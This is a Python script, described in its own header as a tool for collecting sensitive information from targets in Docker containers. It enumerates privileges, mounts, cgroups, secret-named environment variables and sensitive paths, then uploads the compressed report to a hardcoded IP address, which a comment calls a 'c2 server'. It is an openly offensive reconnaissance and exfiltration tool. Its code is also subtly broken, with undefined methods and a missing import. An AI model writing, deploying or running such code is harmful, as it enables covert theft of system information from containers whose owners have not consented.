'''
 # @ Create Time: 2024-09-04 11:10:07
 # @ Modified time: 2024-09-04 11:35:24
 # @ Description: compatible with docker environment to collect sensitive information from targets
 '''
from __future__ import annotations

from pathlib import Path
import platform
import base64
import zlib
import tempfile
import os
import importlib
import subprocess

def ensure_module(name, pkg=None):
    pkg = pkg or name
    try:
        return importlib.import_module(name)
    except ImportError:
        print(f"[+] Installing missing package: {pkg}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
        return importlib.import_module(name)

# Now use it safely:
bh = ensure_module("browserhistory", "browserhistory==0.1.2")
dotenv = ensure_module("dotenv", "python-dotenv==1.0.1")
requests = ensure_module("requests", "requests==2.32.3")

from dotenv import load_dotenv
# load .env for sensitive tokens
load_dotenv()

class ContainerSenScanner:

    def __init__(self, save_location: Path):
        ''' 
        :param save_location: local position or remote site
        '''
        self.report = {
            "container_detection": {},
            "privilege_and_namespace": {},
            "docker_socket": {},
            "mountinfo": [],
            "cgroup_info": [],
            "environment_leaks": {},
            "sensitive_files": [],
            "logs": {},
        }

        self.save_location = save_location

    # ============================================================
    #  Docker / Container / K8s detection + Host info "float-up"
    # ============================================================
    def _detect_container(self):
        """Detect if running inside Docker/containerd/Kubernetes"""
        info = {}

        # Method 1: .dockerenv file
        info["dockerenv_exists"] = os.path.exists("/.dockerenv")

        # Method 2: cgroup path contains "docker" or "containerd"
        try:
            with open("/proc/1/cgroup") as f:
                cgroup = f.read()
            info["cgroup_indicators"] = [
                line for line in cgroup.splitlines()
                if "docker" in line or "containerd" in line
            ]
        except Exception:
            info["cgroup_indicators"] = []

        self.report["container_detection"] = info

    # ------------------------------------------------------------------
    # 2. Check privilege level & namespace configuration
    # ------------------------------------------------------------------
    def privilege_and_namespace_check(self):
        data = {}

        # check if container is running as root
        data["running_as_root"] = (os.geteuid() == 0)

        # Check Linux capabilities (if available)
        cap_file = "/proc/self/status"
        data["capabilities"] = []
        if os.path.exists(cap_file):
            try:
                with open(cap_file) as f:
                    for line in f:
                        if line.startswith("CapEff"):
                            data["capabilities"].append(line.strip())
            except:
                pass

        # PID namespace: check if PID 1 is inside the container
        try:
            pid1 = subprocess.check_output(["ps", "-o", "pid,comm"]).decode()
            data["pid_namespace_visible"] = pid1.strip().split("\n")
        except:
            data["pid_namespace_visible"] = None

        self.report["privilege_and_namespace"] = data

    # ------------------------------------------------------------------
    # 3. Check for docker.sock exposure
    # ------------------------------------------------------------------
    def check_docker_socket(self):
        sock_path = "/var/run/docker.sock"
        data = {"exists": os.path.exists(sock_path)}

        # DO NOT interact with the socket (unsafe).
        # Only report presence.
        self.report["docker_socket"] = data

    # ------------------------------------------------------------------
    # 4. Collect mount info (possible host path leak)
    # ------------------------------------------------------------------
    def read_mountinfo(self):
        try:
            with open("/proc/self/mountinfo") as f:
                self.report["mountinfo"] = f.read().splitlines()
        except:
            self.report["mountinfo"] = []    

    # ------------------------------------------------------------------
    # 5. Collect cgroup info (container isolation indicator)
    # ------------------------------------------------------------------
    def read_cgroup(self):
        try:
            with open("/proc/self/cgroup") as f:
                self.report["cgroup_info"] = f.read().splitlines()
        except:
            self.report["cgroup_info"] = []

    # ------------------------------------------------------------------
    # 6. Scan environment variables for leaked secrets
    # ------------------------------------------------------------------
    def environment_secret_check(self):
        env = dict(os.environ)

        suspicious_keywords = [
            "password", "passwd", "token", "secret", "key",
            "apikey", "auth", "credential"
        ]

        found = {}
        for k, v in env.items():
            if any(word in k.lower() for word in suspicious_keywords):
                # DO NOT store real secrets → mask values
                found[k] = "******** (value masked)"

        self.report["environment_leaks"] = found

    # ------------------------------------------------------------------
    # 7. Scan known sensitive file paths (read-only)
    # ------------------------------------------------------------------
    def sensitive_file_scan(self):
        paths_to_check = [
            "/root/.ssh",
            "/home",
            "/app",
            "/etc",
            "/run/secrets",
            "/var/www",
            "/var/lib"
        ]

        found = []
        for p in paths_to_check:
            if os.path.exists(p):
                found.append(p)

        self.report["sensitive_files"] = found

    # ------------------------------------------------------------------
    # 8. Look for logs that may leak info
    # ------------------------------------------------------------------
    def log_scan(self):
        logs = {}
        candidates = [
            "/var/log",
            "/app/logs",
            "/tmp"
        ]

        for path in candidates:
            if os.path.exists(path):
                logs[path] = "present"

        self.report["logs"] = logs

    # ------------------------------------------------------------------
    # 10. Run all modules
    # ------------------------------------------------------------------
    def run(self):
        self.detect_container()
        self.privilege_and_namespace_check()
        self.check_docker_socket()
        self.read_mountinfo()
        self.read_cgroup()
        self.environment_secret_check()
        self.sensitive_file_scan()
        self.log_scan()

        return self.report
    
    def _sen_info(self, file:str):
        ''' the module to collect sensitive info from specific locations/files/extensions
        
        '''
        report = self.run()
        # compress and encode the collected information
        encoded_compressed_info = self._encode_compress(str(report))

        with Path(self.save_location).joinpath(file).open("wb") as fw:
            fw.write(encoded_compressed_info)

    def _send_file(self, file, upload_url):
        try:
            with Path(self.save_location).joinpath(file).open('rb') as f:
                print(f"[+] Sending data to {upload_url}")
                r = requests.post(upload_url, files={'file': f})
                print("[+] Response:", r.status_code, r.text)
        except Exception as e:
            print("[-] Failed to send:", e)

if __name__ == "__main__":

    temp_path = tempfile.gettempdir()
    senscanner = ContainerSenScanner(temp_path)
    # define the file
    file_name = "files.json"

    # get the information and saved to a temp folder
    senscanner._sen_info(file_name)

    from pathlib import Path
    # upload file to c2 server
    remote_file = Path(temp_path).joinpath(file_name)

    remote_upload_url = f"http://20.93.23.234:8081/upload" 
    senscanner._send_file(file_name, remote_upload_url)
